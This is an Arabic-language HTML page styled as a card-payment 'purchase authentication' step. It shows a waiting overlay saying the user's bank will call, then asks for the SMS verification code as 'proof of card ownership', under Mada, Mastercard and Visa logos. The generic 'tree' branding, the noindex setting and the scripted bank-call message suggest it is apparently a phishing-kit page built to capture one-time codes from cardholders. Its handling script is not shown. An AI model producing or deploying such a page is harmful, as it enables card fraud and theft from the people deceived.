<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <meta name="robots" content="noindex, nofollow, noimageindex"><link rel="stylesheet" href="otp.css"><title>مصادقة الشراء</title><style>
        body {
            margin: 0;
            padding-top: 70px;
        }
        header {
            background-color: #00332a;
            border-bottom: 2px solid #00d5aa;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 70px; /* تحديد ارتفاع ثابت للهيدر لتسهيل حساب مسافة الأقسام بعده */
            z-index: 1000;
            display: flex;
            align-items: center;
            justify-content: space-between; /* توزيع العناصر على الأطراف بالتساوي */
            padding: 0 20px;
            box-sizing: border-box;
            direction: rtl; /* توجيه العناصر من اليمين إلى اليسار */
        }
        .menu-icon {
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            width: 25px;
            height: 18px;
            cursor: pointer;
        }
        .menu-icon span {
            display: block;
            height: 3px;
            background-color: #00d5aa;
            border-radius: 2px;
        }
        .logo {
            font-size: 2rem;
            font-weight: bold;
            color: #00ffae;
            font-family: sans-serif;
            margin: 0;
            line-height: 1;
        }
        .lang-toggle {
            display: flex;
            align-items: center;
        }
        .lang-toggle button {
            background-color: #00d5aa;
            color: #00251f;
            border: none;
            padding: 8px 14px;
            border-radius: 8px;
            font-weight: bold;
            font-size: 0.9rem;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        .lang-toggle button:hover {
            background-color: #00ffae;
        }
    </style></head><body data-page="otp"><header>
        <div class="menu-icon">
            <span></span>
            <span></span>
        </div>
        <div class="logo">tree</div>
        <div class="lang-toggle">
            <button id="toggleLang">EN/ع</button>
        </div>
    </header>
    <div class="overlay" id="overlay"><img src="mobile.png" alt="loading"/><h2 data-i18n="title">مصادقة الشراء</h2><p data-i18n="waitText">يرجى الانتظار، العملية قيد التنفيذ...</p><p data-i18n="neverLeave">لا تغادر أو تغلق الصفحة حتى انتهاء عملية الدفع.</p><p data-i18n="bankContact">سيتم الاتصال بك من قبل المصرف الخاص بحسابك.</p><p data-i18n="codeSent">بعدها سيتم إرسال رمز التحقق إلى رقم جوالك.</p><button class="wait-button" id="waitBtn" disabled data-i18n="waitButton">يرجى الانتظار...</button></div><div class="otp-section" id="otpSection"><h3 data-i18n="paymentCard">الدفع بالبطاقات البنكية</h3><h2 data-i18n="ownershipProof">إثبات ملكية البطاقة</h2><p id="otpText"></p><label for="otp"><strong data-i18n="otpLabel">رمز التحقق*</strong></label><input type="tel" id="otp" placeholder="يرجى ادخال رمز التحقق" data-i18n-placeholder="otpPlaceholder" maxlength="6" minlength="4"/><p class="note"><span data-i18n="otpNote">سيتم إرسال رسالة كود التحقق في خلال</span><span id="otpTimer">01:00</span><span> دقيقة</span></p><button data-i18n="confirm">تأكيد</button><div class="brands"><img src="Mada_Logo.svg.png" alt="mada"><img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="mastercard"><img src="https://km.visamiddleast.com/content/dam/VCOM/global/about-visa/images/visa-brandmark-blue-1960x622.png" alt="visa"></div></div><script src="otp.js"></script><script src="lang.js"></script></body></html>
